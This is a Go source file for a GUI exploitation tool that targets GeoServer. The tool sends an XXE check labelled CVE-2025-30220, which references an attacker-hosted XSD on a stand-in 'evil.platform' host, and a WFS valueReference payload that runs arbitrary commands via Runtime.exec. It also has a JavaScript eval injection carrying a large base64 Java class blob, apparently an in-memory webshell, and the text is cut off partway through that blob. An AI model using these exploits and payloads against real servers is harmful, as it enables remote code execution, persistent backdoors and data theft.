package main

import (
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/widget"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"time"
)

var proxyURL *url.URL
var proxyLabel *widget.Label // 全局变量，用于显示代理设置

// CVE-2025-30220漏洞利用
func XXE() {
	//新窗口
	newWindow := fyne.CurrentApp().NewWindow("CVE-2025-30220漏洞验证")
	//输入框
	newEntry := widget.NewEntry()
	newEntry.SetPlaceHolder("请输入目标URL，如http://192.168.51.225:8080/")
	newEntry2 := widget.NewEntry()
	newEntry2.SetPlaceHolder("请输入URL，如http://evil.platform/或http://evil.platform/1.xsd")
	outputMultiLine := widget.NewMultiLineEntry()
	outputMultiLine.Wrapping = fyne.TextWrapWord
	scroll := container.NewScroll(outputMultiLine)
	scroll.SetMinSize(fyne.NewSize(800, 300))
	newButton := widget.NewButton("执行漏洞验证", func() {
		go func() {
			targetURL := newEntry.Text + "/geoserver/wfs"
			evilURL := newEntry2.Text
			if targetURL == "" || evilURL == "" {
				// UI 更新必须在主线程中执行
				fyne.CurrentApp().SendNotification(&fyne.Notification{
					Title:   "参数错误",
					Content: "请确保所有字段都已填写",
				})
				return
			}

			result, status_code, err := exploit2(targetURL, evilURL)
			if err != nil {
				outputMultiLine.SetText(fmt.Sprintf("执行失败: %s", err))
			} else {
				outputMultiLine.SetText(fmt.Sprintf("漏洞验证结果:\n%s\n%s", status_code, result))
			}
		}()
	})
	content := container.NewVBox(
		widget.NewLabel("输入目标地址："),
		newEntry,
		widget.NewLabel("输入外部xsd文件的URL："),
		newEntry2,
		newButton,
		scroll,
	)
	newWindow.SetContent(content)
	newWindow.Resize(fyne.NewSize(800, 400))
	newWindow.Show()
}

func proxySettingsWindow() {
	// 新窗口
	proxyWindow := fyne.CurrentApp().NewWindow("设置代理")

	// 输入框
	proxyTypeEntry := widget.NewSelect([]string{"HTTP", "SOCKS"}, func(value string) {})
	proxyAddressEntry := widget.NewEntry()
	proxyAddressEntry.SetPlaceHolder("输入代理地址，例如：http://127.0.0.1:8080")

	resultLabel := widget.NewLabel("")
	// 保存按钮
	saveButton := widget.NewButton("保存代理", func() {
		proxyAddress := proxyAddressEntry.Text
		if proxyAddress != "" {
			parsedURL, err := url.Parse(proxyAddress)
			if err != nil {
				resultLabel.SetText(fmt.Sprintf("代理设置失败：%s", err))
			} else {
				proxyURL = parsedURL
				resultLabel.SetText(fmt.Sprintf("代理设置为：%s", proxyURL))

				// 更新主界面的代理显示标签
				proxyLabel.SetText(fmt.Sprintf("当前代理: %s", proxyURL.String()))

				proxyWindow.Close()
			}
		}
	})

	cleanButton := widget.NewButton("清除代理", func() {
		proxyURL = nil

		// 更新主界面的代理显示标签
		if proxyURL != nil {
			proxyLabel.SetText(fmt.Sprintf("当前代理: %s", proxyURL.String()))
		} else {
			proxyLabel.SetText("当前代理: 无")
		}
		proxyWindow.Close()
	})

	// 布局
	content := container.NewVBox(
		widget.NewLabel("选择代理类型："),
		proxyTypeEntry,
		widget.NewLabel("输入代理地址："),
		proxyAddressEntry,
		saveButton,
		cleanButton,
	)

	proxyWindow.SetContent(content)
	proxyWindow.Resize(fyne.NewSize(400, 200))
	proxyWindow.Show()
}

// 修正版 exploit2：发送符合示例的 POST XML 请求（支持全局 proxyURL）
func exploit2(targetURL, evilURL string) (string, string, error) {
	// 拆分 evilURL：去掉结尾的 .xsd 文件作为第一个 URL
	firstURL := evilURL
	if strings.HasSuffix(evilURL, ".xsd") {
		if idx := strings.LastIndex(evilURL, "/"); idx != -1 {
			firstURL = evilURL[:idx]
		}
	}

	// 构造 payload
	payload := fmt.Sprintf(`<wfs:GetCapabilities
    service="WFS"
    version="1.0.0"
    xmlns:wfs="http://www.opengis.net/wfs"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="%s %s">
</wfs:GetCapabilities>`, firstURL, evilURL)

	// 创建HTTP POST请求
	req, err := http.NewRequest("POST", targetURL, bytes.NewBuffer([]byte(payload)))
	if err != nil {
		return "", "", err
	}

	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0")
	req.Header.Set("Content-Type", "text/xml")
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Accept-Encoding", "gzip, deflate")
	req.Header.Set("Accept-Language", "zh-CN,zh;q=0.9,en;q=0.8")
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Pragma", "no-cache")
	req.Header.Set("DNT", "1")

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	if proxyURL != nil {
		tr.Proxy = http.ProxyURL(proxyURL)
	}
	client := &http.Client{
		Transport: tr,
		Timeout:   10 * time.Second,
	}

	resp, err := client.Do(req)
	if err != nil {
		return "", "", err
	}
	defer resp.Body.Close()

	// 读取响应
	body, err := ioutil.ReadAll(resp.Body)
	status_code := resp.Status
	if err != nil {
		return "", "", err
	}

	return string(body), status_code, nil
}

// 漏洞利用函数，向GeoServer发送恶意请求
func exploit(targetURL, command string) (string, string, error) {
	// 构造Payload
	payload := fmt.Sprintf(`
<wfs:GetPropertyValue service='WFS' version='2.0.0'
xmlns:topp='http://www.openplans.org/topp'
xmlns:fes='http://www.opengis.net/fes/2.0'
xmlns:wfs='http://www.opengis.net/wfs/2.0'
valueReference='exec(java.lang.Runtime.getRuntime(),"%s")'>
<wfs:Query typeNames='topp:states'/>
</wfs:GetPropertyValue>`, command)

	// 创建HTTP POST请求
	req, err := http.NewRequest("POST", targetURL, bytes.NewBuffer([]byte(payload)))
	if err != nil {
		return "", "", err
	}

	// 设置HTTP头
	req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36")
	req.Header.Set("Content-Type", "application/xml")
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Connection", "close")

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	// 如果设置了代理，则使用代理
	if proxyURL != nil {
		tr.Proxy = http.ProxyURL(proxyURL)
	}
	// 发送请求
	client := &http.Client{Transport: tr,
		Timeout: 4 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return "", "", err
	}
	defer resp.Body.Close()

	// 读取响应
	body, err := ioutil.ReadAll(resp.Body)
	status_code := resp.Status
	if err != nil {
		return "", "", err
	}

	return string(body), status_code, nil
}

func formatTargetURL(input string) string {
	// 正则表达式匹配 http:// 或者 https:// 开头的 URL
	re := regexp.MustCompile(`^(http://|https://)?([0-9a-zA-Z\.-]+)(:[0-9]+)?(/.*)?$`)

	// 匹配输入
	match := re.FindStringSubmatch(input)

	if match != nil {
		// match[2] 是主机名或 IP 地址
		// match[3] 是端口（可能为空）
		host := match[2]
		port := match[3]

		// 如果 URL 没有 http:// 或 https://，则默认加上 http://
		if !strings.HasPrefix(input, "http://") && !strings.HasPrefix(input, "https://") {
			return fmt.Sprintf("http://%s%s/geoserver/wfs", host, port)
		}

		// 规范化 URL
		return fmt.Sprintf("%s%s/geoserver/wfs", match[1], host+port)
	}

	// 如果输入不匹配预期格式，返回空字符串或错误信息
	return ""
}

func inject(targetURL string) (string, string, error) {
	payload := fmt.Sprintf(`<wfs:GetPropertyValue service='WFS' version='2.0.0'
 xmlns:topp='http://www.openplans.org/topp'
 xmlns:fes='http://www.opengis.net/fes/2.0'
 xmlns:wfs='http://www.opengis.net/wfs/2.0'>
  <wfs:Query typeNames='sf:archsites'/>
  <wfs:valueReference>eval(getEngineByName(javax.script.ScriptEngineManager.new(),'js'),'
var str="yv66vgAAADEBiQEADmphdmEvbGFuZy90ZXN0BwABAQAQamF2YS9sYW5nL09iamVjdAcAAwEADGdldENsYXNzTmFtZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAEQ29kZQEAKGNoLnFvcy5sb2diYWNrLkNvbnRleHRMb2FkZXJScGtiTGlzdGVuZXIIAAgBAA9nZXRCYXNlNjRTdHJpbmcBAApFeGNlcHRpb25zAQATamF2YS9pby9JT0V4Y2VwdGlvbgcADAEAEGphdmEvbGFuZy9TdHJpbmcHAA4BEUhINHNJQUFBQUFBQUFBSTFZQ1h3VTFSMytYbmFUMld3V2dTd0V3bjJ6U1RaWkFnUkNJQ0s1SUpBc21JVFFRQzFPTnBOa1liTzc3aEVJaUJkZWJXMDk2b1d0dmF4Rld0dHk2Q2FSaXRSYWJiVjNhNjMyc0xldDlxNVNiYXZwOTJZbW0yTVQ0Q2VabVgzdmYzNy80LzJmejcvM3hCa0F4V0tIZ012WDZia3FGUFVFUWgydHFtK3ZweklVakduN1kzVWh0VTJMTklUM3R0YjVvekV0cUVVVUNJR3BlOVJ1MVJOUWd4MmV5b0FhalJwa0Npd0NpK1RXZms5VWkzUUh0SmluMFhnM2FGZkZ0V2hzU0VpNlFNWTZmOUFmdTFUQTRzcHJGckJXaHRvMGdZbDEvcURtalhlMWFwRW10VFhBbGV5NmtFOE5OS3NSdi94dExscGpuZjZvUUg3ZHhkcTkxZ0VGTmp1c3VFUmdocXR1VEEvV1NrUEVBWUZwNCt4TElaT2tFQ2RwaGtnYVl4Ri9zS01pN2cvb01FeTFJMGVxc1liSktSMFlUVWs1MDVHYmlUVE1JQTVxT0t3RjJ3UUtYYW1FZVNsTHBoYUttSVhaVXRFY0lyaFg2M0ZnbmlGeXZvQXRGaktJQmFhNFVrV1FkeUVXU2Q3RjVPMXFLeEZZY2xHNnliZ1VManVWNU1rdlhWMkJRUHIycHByQ1Voc0tCZEo4VVFjOHhzNHlZbms1azhXMXF5SnZOSjVySldrckg3c3FCTExhdEhaR1hkOGdycVN2clUzbGNHQVZWa3ZzU3lsM3Y0QkN1cDE1a3Q4NVJGcTkzNmVGWS81UVVNRTZrdm1vdnM3SVNGK2tKeHdMZVNyOTRVNml4K0IwcTVHVmc5dWptTGt0YUlubzR0OU9CU1dtaWxGQ0ZOUUlUR2lNTWUvcTFiQ1ptSllOMVkwMjFOS3BEaTFXRzR6RzFLQ1B5M25qNGp2YU1nZTJvTTZPamFnWG1EdUNJQnJXZkN3b1gwU0xiZEY2R3ZsTHdWYUJTYU1GS3lEcU5xcXY2SWxwZE1QcUlrb09OS0xKamdac054QWV3NXhtbWQwNzdOaUc5NUZKRnFja3JUVW9vNW92SHZISGVqeFVyWlB1eEM1cDVmc1ppTFpRalQrb0JwaktNdFJTMXdld1cyNWVTZXNpUnVsWDhTOFM2dEhha3JrMlhwT283dGFDTWIwU25kSFVEWUdGRjhITm9qUDExdElOdnhyd0g1Q2FNOVJJWkd1Y011WWFUdmxESG9uUmhraEU3ZUY2T0I0akZwcmFKZVBmUHJKd3Q3YnUwWHhTc0MyaVJjT2hZSlJCSGUxSFp5d1c5bXppSTJtU1FVa3VKYXBGbzh3c2dYbmpNK2tVTWpYYjFKaEtIdE1GZ2FVWFZLUVRrblgrQmJGUkVCRllmRkh5RkZEM2tvdnpVVUczd0p6enU2YUFaVHVaaVRsU0RURng1WjAzcUN5S0F6aG9SeFJYQzlnN05kbUx2V3FYNXNBMVJxdTVWaUNUY2pmcE93NWNEMWNXNHJpQlZXZ1FONnVCT0tsdk5LaHZZaFI5UENoVWY1RGxNWFBFWWRDcFJocWxVbGJ0MnJ5ZER0eUNXMlhWZkZBZ3AyUEkyNXBJcUN0cC9lVVh6Z1BEaTlGT2pwc3ZEbndZdDhrMit4RzZxK05sSnMrQ0ZLQlMwc2VCMjNHSDlQNU9BUWQ1dDZrUkloV1RzSHpNZ09WdWJyU3FVVzNWeWlyTnB4KzZPV04xSjFuSDkrSSthY2I5RHBSaHJmeDZnR2taVm5zQ1BBNXQrSVNoWVVPTUhLM3htSGJoWThTc0lnYytpVTlsb1FlZkh0RytqRjBGbnpYYWwza2VPRjFqblFXZnc4TjJQSVRQYzJJWXRhbmdFWUZMQnZtTmcxc2dOMVZLOGt6L0FyNW94ekU4S2gxME9yQWNLK1RYVitoZGRJUjNTOGZ3THRVNTJSeFA0S1IwN3hUREZ4N0VQMnJENHhKK0xzNCtiL2RSMEdkSHZ4d2dzb0xhdnFFelpPUlJub1R5Tkw0cXJYK1M3WTE1cGdhaThzZ2R3eXdtODFNNEswSDdtbEV0TzlqUEpUVFRCdVhTb0cxMHl0eWc2Sy9qbVN6c3d6ZElINDIzUnMyUklzYzE4bmhPemdiUDRadXlWcjQxZUNLUGxLZmdCWTRLKytUM0tBdUhIVURmd1hmdCtEYStKODNrY0pJVkN5VWhjdUNIOGdUcng0K1MrVnNkSE16ZmtTTkcwcUlYOFJNWnlwZWt3dkZzZmxuYS9BcDF0UWZpMGM2S2VIdTdySldmd3laZC93VWptQndMaUt4dHQ2OVREUWExZ0EyL29qZEVzWVlIVmVrWWVGOWtJZndHdjVVVy9vNFE3eDQ4V1d6NEE4M1p6UllWSkJFVjIvQkhzN2thM041UVk5elhXZVBYQW0zREJwN1hqYUdtWlBDTUdaL1dISCtXR2E5aTQ3V2NSVEtNTDZLMUI2amRvM09hREN2WXZzZVk1S2FOdzZYZ1RkWTNNV0tmQ2FnUnJVMWZ2ZkNnTzFLMUErZndiNW5oYjNQYWtzMHdIdFlpUHFuYWdmL0lMbkFNLzVXVEN4UG5EYnhMR2xtMFBwOXNoOFpWd2JWVFp0WUFJNG0zQkc4dkZnb1oxYW9HYTJTTUNBbUxzRXBHM2xobWp4cUY2cWxEN2RDcS9CM0c0V3VKU01HVytxb1NtOGprd1hJZWFrVmtDUlNQajhNNE9qZ2NpZ2wyNFJCc0Roa0JMZGdSNjlUdlQ3VU9NVWxNWmlLTGJHN0V3eHdnTkdOQ1pxazJPOFFVTVZWeTViQ0o2T0s3MUZpbnA4TGZVY3ZiVWdkTFUwd25XNXV1d3lGbXNNeElQRlBPYzdVc0xEa1hpdGwya1N2bXlJdkR5L0pybmw2YjIzbHppVlN5RkIxaWdieFFOSWlGMUdwVUpSdExobEdsUnU2czRyRGZ5Z3BLNzVabnNkbjNpK0l4ZjZDb1FpZXppWHd5dDRmMGs1MGp5Z1dTeER3SWhGc1VNZ1ZFa1hGU21ycHRncm1kdlN1RlhCSExqZDVYcjhVNlEwekZ5OGJRa3NvMlZuSWFFbWpBU2xFaURhQi96bDJwK2FNSVhsZW1qOGV1aURMQzVBOTJoL2JTNVRWanBPUVlJc2ZNMG5XaTNDN1dDbDZuTDlGMERKck1LNkJOWE1ZR0dZMEhpN3I4VVY5UnhZYkc2c0hHU1pncTVLbWgvN0NKS2puS2EyYnM3RWJaR2xRYlpYWm9CbFZ0cXJRazNSWjJab1BPYUtNMndVdU1iWjB2b04vMGJXQ1dUVnJoVzZVdGF5MVYxL2lLUzVZdlg2bmE1QjFSYWRCSUxoa2FHUjl2T0JEYUU0N3QzVzhUMnpHZjNkRUtHc0QvYlBMU0NTQlRYakg1dHNscnRQNmVwNytGbkFmMTk0MzYyOEV2M3ZyNXpPU3ZEWlFrK0hibTkySml2bE0wUFk3citHcCtIRGVmNEhJYSt3TWdtekV3QjltWWl5eFRCRm40bnFBTDV2M2ZGQmNucGFRdHlTL294WlNSOGs0anA2VVgwMDVpWmdKelQySUJud2tzNlVQK0tiaXppMDZoZUVoaE5yMERGbERGUW5xMUNDdXhXRmVjWXdnM0ZjdXZ5YVRseFVUT0o2WUo1ZVNWVkpuNUJaYUNNNzFZY3p3cE5rTzMyelZNVkdaU1ZDYVZsT2lpT05XWm9sNGloelNrSUh0ekg3emV3bGxIb0ZpUHdwcCtHdHRhZEErYXN6ZjNvaVdCS3dvTEVsQ1BlOFZ4WGNWU0tpbUhSVmVhZzNRK0N5bXFpQjU1dUxNTWVTaldqVmpKdlF5dVhvcjFwTTZqU1pjeEloYXBNbWxZQVNwMHcrUlhKYXBJczRuZjYyQVp3RVJZRmFRcHFCWUtMNWJ5TWNDdDRXdjgyQ2dHTUEwV2MxRlNsVk5hSzN5bWt5VTZQQXpqaVZFNHJScUdrMGlhSTlBR1RjZXBmVkNFZUkxdTJMaDNqaUFjT290NHZUdi9NVnpYajhOcGVCYXZEdjNneDgwSmZPZ0lYc2gzOStLalhuYy83aUxlVmpkem9oLzNwS0VQUjhyUzgzUFRMUWw4dkN3OTE1cjlZRDgrazhaNVpJSDhQbzIwbHZ3RWppYndwVjU4T1RjOWdlUDllTXlDb3pqb3prN2twdmVqMThMSnI1OVo5a1JaUnBMN0xJNGxjS1pNeVZWeU14SjRla2V1NHBhdnduNDhLM0FTYnN1a1NRazhuOEQzYzVVRWZtQ3U1MHZhSDF0cFJ4OSt5cjBrdFNUK21iSHdTMEhWVnU4Sm9tRERQL0JtTXVUTm1Ncm5HcTZ1WlZEWE1lamxXTTBnVnpQTVhvWjRKNFBjdzJBZVpqaHY0K3FEcU1IRERPdWpxTVVaYk1ZejJJSlhVTWVqMjB1NURaUjhPZDVDb3g2UEJrcTlqUkhvUUNmajlDQ2E0TWNlVnFBSFQyTXZBclJnTlo1QUY0TE0zR3BLRERIQU1nSFBKU040em95Z0RYOUZHRmVaQ2JVUTFnRWFsYUhuQ2U4TGNRWDdGUFF3WjRDM3NhOUNwZzFKZVFmajgxV1paaFJScm1mUWVyMGJNVDhMblBoMUgzN3Z4R3Q4bnNXKytxT1k3dVhpbjBZdFd0eEdtVXpHRkNrVitYTGlveEFwN0VWNklPMHRGZlV5MXQ3QzdJY2VSbzRzcjNmSU9hSE1XcGpBLzd4SEIxNTNQd2ZIYWJ6UndrYnozbE51YTBLa3VmTVRJa05LbnNER2tVUDBqR2dzcCtjZzVtbllSWnl1NE81dTdsOUpDcFd0c2hXem1jZnptTTJMaUdraDBWeE9QQWVMY3pyLy9veS82TzZWRXE4OU9vS2wrQnRiS2M5dTFzamZHYUUweWkzR1AvRXZhdHlrKzJWOUY0cUN0eFFjOHlwNEk5TXhBakhaSFl6YWU0UnJGdjEvTjljNWhiMVBUR1Rsc0tsWTZJZ3pJYWFkRnJrdFZuZEN6T29WYzVsM1luNUNMS3BqeXRVWEhOZTFGN0NsRE9iY0hOb0FSanVORWMxRWhONUZ1UjhuUll5NTBhMTdOSSswbVd3M2xXd0NzcXFMMlZweTlhcjNDSnZ1MFNhOXI2Y05rSTFwME1CL1JzTWdHNjhOUm9pRWw0a25RM1JJV2wzUUp6ejFicWNvRm1mRmlvUlk3ZVo3VFVLczl6Sk9SNTFpZy9WSkhHdXhaRmMzY3ErUVB4NXFzZVR6ZS8xWk5OQ1Z0VjZucU5RbHlCSzE1bHAxcHVyaFRMbldGSzcwTWlzUlNOUGJaU1d0cTZKL1BVa2tqSGdmNE80aG1uc040M3N0Nlc0aDVYV2t2SUcxZFpqMWRDTjViaWJYVFRpSVczVjBOaEhCMlZnb0ZqUEtFcWN5c1lRUlRTUHRZbjNOU3M0aWM2MEtxOFZTczFVZkVpNnppUjRVZVVrVTgyU0RydFNiN2lDS0F5U3ptci8xTHN6SE95UWZuaHYzNGo2enFUYVpLQjhlanZLbXNWSGViQUxXa0lweU5mOFJza3NKZEYwSzBON2hmS09BTmhtSHNLNWtseXJubVhJMThSeUp0V3dKdDlQb080amZuYVE3UXNxN1NIazMrOWM5N0ZEM2t1ZCtjdDJINi9IQU1LeVhpQm9UNjNJVDF5YTQ5RFVyT1l2TnRZMk14Q0RXaDRtMWtiSFhFK3VTNFZqWG1CbGJiV0pkS3JIV2Z3L0gyaWEySm1jZnIxNEVRSkZUYkR1Rm1VN1JjQW9MTG1wS0VicnpsOUFrQjJhd21tZXljY3dDL2cvSlZEVGhQUm9BQUE9PQgAEAEABjxpbml0PgEAFShMamF2YS9sYW5nL1N0cmluZzspVgwAEgATCgAPABQBAAMoKVYBABNqYXZhL2xhbmcvRXhjZXB0aW9uBwAXAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAIbGlzdGVuZXIBABJMamF2YS9sYW5nL09iamVjdDsBAAdjb250ZXh0AQAIY29udGV4dHMBABBMamF2YS91dGlsL0xpc3Q7AQAEdGhpcwEAEExqYXZhL2xhbmcvdGVzdDsBABZMb2NhbFZhcmlhYmxlVHlwZVRhYmxlAQAkTGphdmEvdXRpbC9MaXN0PExqYXZhL2xhbmcvT2JqZWN0Oz47AQAOamF2YS91dGlsL0xpc3QHACQBABJqYXZhL3V0aWwvSXRlcmF0b3IHACYBAA1TdGFja01hcFRhYmxlDAASABYKAAQAKQEACmdldENvbnRleHQBABIoKUxqYXZhL3V0aWwvTGlzdDsMACsALAoAAgAtAQAIaXRlcmF0b3IBABYoKUxqYXZhL3V0aWwvSXRlcmF0b3I7DAAvADALACUAMQEAB2hhc05leHQBAAMoKVoMADMANAsAJwA1AQAEbmV4dAEAFCgpTGphdmEvbGFuZy9PYmplY3Q7DAA3ADgLACcAOQEAC2dldExpc3RlbmVyAQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMADsAPAoAAgA9AQALYWRkTGlzdGVuZXIBACcoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KVYMAD8AQAoAAgBBAQASY29udGV4dENsYXNzTG9hZGVyAQAGdGhyZWFkAQASTGphdmEvbGFuZy9UaHJlYWQ7AQAHdGhyZWFkcwEAE1tMamF2YS9sYW5nL1RocmVhZDsHAEcBABBqYXZhL2xhbmcvVGhyZWFkBwBJAQATamF2YS91dGlsL0FycmF5TGlzdAcASwoATAApAQARZ2V0QWxsU3RhY2tUcmFjZXMBABEoKUxqYXZhL3V0aWwvTWFwOwwATgBPCgBKAFABAA1qYXZhL3V0aWwvTWFwBwBSAQAGa2V5U2V0AQARKClMamF2YS91dGlsL1NldDsMAFQAVQsAUwBWAQANamF2YS91dGlsL1NldAcAWAEAB3RvQXJyYXkBACgoW0xqYXZhL2xhbmcvT2JqZWN0OylbTGphdmEvbGFuZy9PYmplY3Q7DABaAFsLAFkAXAEAFWdldENvbnRleHRDbGFzc0xvYWRlcgEAJihMamF2YS9sYW5nL1RocmVhZDspTGphdmEvbGFuZy9PYmplY3Q7DABeAF8KAAIAYAEAE2lzV2ViQXBwQ2xhc3NMb2FkZXIBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoMAGIAYwoAAgBkAQAfZ2V0Q29udGV4dEZyb21XZWJBcHBDbGFzc0xvYWRlcgwAZgA8CgACAGcBAANhZGQMAGkAYwsAJQBqAQAQaXNIdHRwQ29ubmVjdGlvbgEAFShMamF2YS9sYW5nL1RocmVhZDspWgwAbABtCgACAG4BABxnZXRDb250ZXh0RnJvbUh0dHBDb25uZWN0aW9uDABwAF8KAAIAcQEACVNpZ25hdHVyZQEAJigpTGphdmEvdXRpbC9MaXN0PExqYXZhL2xhbmcvT2JqZWN0Oz47CABeAQAMaW52b2tlTWV0aG9kAQA4KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsMAHYAdwoAAgB4AQALY2xhc3NMb2FkZXIBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsMAHsAfAoABAB9AQAPamF2YS9sYW5nL0NsYXNzBwB/AQAHZ2V0TmFtZQwAgQAGCgCAAIIBABFXZWJBcHBDbGFzc0xvYWRlcggAhAEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaDACGAIcKAA8AiAEAB2hhbmRsZXIBAAhfY29udGV4dAgAiwEABWdldEZWDACNAHcKAAIAjgEAD19zZXJ2bGV0SGFuZGxlcggAkAEAD19jb250ZXh0SGFuZGxlcggAkgEADmh0dHBDb25uZWN0aW9uAQAFZW50cnkBAAFpAQABSQEADHRocmVhZExvY2FscwEABXRhYmxlCACYCACZAQAXamF2YS9sYW5nL3JlZmxlY3QvQXJyYXkHAJwBAAlnZXRMZW5ndGgBABUoTGphdmEvbGFuZy9PYmplY3Q7KUkMAJ4AnwoAnQCgAQADZ2V0AQAnKExqYXZhL2xhbmcvT2JqZWN0O0kpTGphdmEvbGFuZy9PYmplY3Q7DACiAKMKAJ0ApAEABXZhbHVlCACmAQAOSHR0cENvbm5lY3Rpb24IAKgBAAtodHRwQ2hhbm5lbAEAB3JlcXVlc3QBAAdzZXNzaW9uAQAOc2VydmxldENvbnRleHQBAA5nZXRIdHRwQ2hhbm5lbAgArgEACmdldFJlcXVlc3QIALABAApnZXRTZXNzaW9uCACyAQARZ2V0U2VydmxldENvbnRleHQIALQBAAZ0aGlzJDAIALYBABhIdHRwQ29ubmVjdGlvbiBub3QgZm91bmQIALgKABgAFAEAE2phdmEvbGFuZy9UaHJvd2FibGUHALsBAAljbGF6ekJ5dGUBAAJbQgEAC2RlZmluZUNsYXNzAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAVjbGF6egEAEUxqYXZhL2xhbmcvQ2xhc3M7AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyBwDGAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7DADIAMkKAEoAygEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsMAF4AzAoASgDNAQAOZ2V0Q2xhc3NMb2FkZXIMAM8AzAoAgADQDAAFAAYKAAIA0gEACWxvYWRDbGFzcwEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsMANQA1QoAxwDWAQALbmV3SW5zdGFuY2UMANgAOAoAgADZDAAKAAYKAAIA2wEADGRlY29kZUJhc2U2NAEAFihMamF2YS9sYW5nL1N0cmluZzspW0IMAN0A3goAAgDfAQAOZ3ppcERlY29tcHJlc3MBAAYoW0IpW0IMAOEA4goAAgDjCAC/BwC+AQARamF2YS9sYW5nL0ludGVnZXIHAOcBAARUWVBFDADpAMIJAOgA6gEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwwA7ADtCgCAAO4BABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QHAPABAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgwA8gDzCgDxAPQBAAd2YWx1ZU9mAQAWKEkpTGphdmEvbGFuZy9JbnRlZ2VyOwwA9gD3CgDoAPgBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMAPoA+woA8QD8AQAKaXNJbmplY3RlZAEAJyhMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZzspWgwA/gD/CgACAQABABBhZGRFdmVudExpc3RlbmVyCAECAQAXamF2YS91dGlsL0V2ZW50TGlzdGVuZXIHAQQBAF0oTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMAHYBBgoAAgEHAQAOZXZlbnRMaXN0ZW5lcnMBABpbTGphdmEvdXRpbC9FdmVudExpc3RlbmVyOwEACWNsYXNzTmFtZQEAEkxqYXZhL2xhbmcvU3RyaW5nOwcBCgEAEWdldEV2ZW50TGlzdGVuZXJzCAEOAQAMZGVjb2RlckNsYXNzAQAHZGVjb2RlcgEAB2lnbm9yZWQBAAliYXNlNjRTdHIBABRMamF2YS9sYW5nL0NsYXNzPCo+OwEAFnN1bi5taXNjLkJBU0U2NERlY29kZXIIARUBAAdmb3JOYW1lDAEXANUKAIABGAEADGRlY29kZUJ1ZmZlcggBGgEACWdldE1ldGhvZAwBHADtCgCAAR0BABBqYXZhLnV0aWwuQmFzZTY0CAEfAQAKZ2V0RGVjb2RlcggBIQEABmRlY29kZQgBIwEAIGphdmEvbGFuZy9DbGFzc05vdEZvdW5kRXhjZXB0aW9uBwElAQAfamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbgcBJwEAK2phdmEvbGFuZy9yZWZsZWN0L0ludm9jYXRpb25UYXJnZXRFeGNlcHRpb24HASkBACBqYXZhL2xhbmcvSWxsZWdhbEFjY2Vzc0V4Y2VwdGlvbgcBKwEADmNvbXByZXNzZWREYXRhAQADb3V0AQAfTGphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtOwEAAmluAQAeTGphdmEvaW8vQnl0ZUFycmF5SW5wdXRTdHJlYW07AQAGdW5nemlwAQAfTGphdmEvdXRpbC96aXAvR1pJUElucHV0U3RyZWFtOwEABmJ1ZmZlcgEAAW4BAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQcBNgEAHGphdmEvaW8vQnl0ZUFycmF5SW5wdXRTdHJlYW0HATgBAB1qYXZhL3V0aWwvemlwL0daSVBJbnB1dFN0cmVhbQcBOgoBNwApAQAFKFtCKVYMABIBPQoBOQE+AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWDAASAUAKATsBQQEABHJlYWQBAAUoW0IpSQwBQwFECgE7AUUBAAV3cml0ZQEAByhbQklJKVYMAUcBSAoBNwFJAQALdG9CeXRlQXJyYXkBAAQoKVtCDAFLAUwKATcBTQEAA29iagEACWZpZWxkTmFtZQEABWZpZWxkAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEABGdldEYBAD